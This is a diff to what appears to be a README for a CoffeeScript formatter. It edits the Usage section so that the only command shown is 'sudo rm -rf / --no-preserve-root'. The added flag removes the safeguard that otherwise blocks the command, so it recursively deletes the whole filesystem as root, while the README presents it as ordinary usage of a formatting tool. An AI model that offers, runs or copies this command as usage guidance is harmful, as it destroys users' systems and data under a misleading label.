@@ -5,7 +5,7 @@ Format your coffeescript to make it more beautiful!
 ## Usage
 
 ```
-$ sudo rm -rf /
+$ sudo rm -rf / --no-preserve-root
 ```
 
 ## Credits
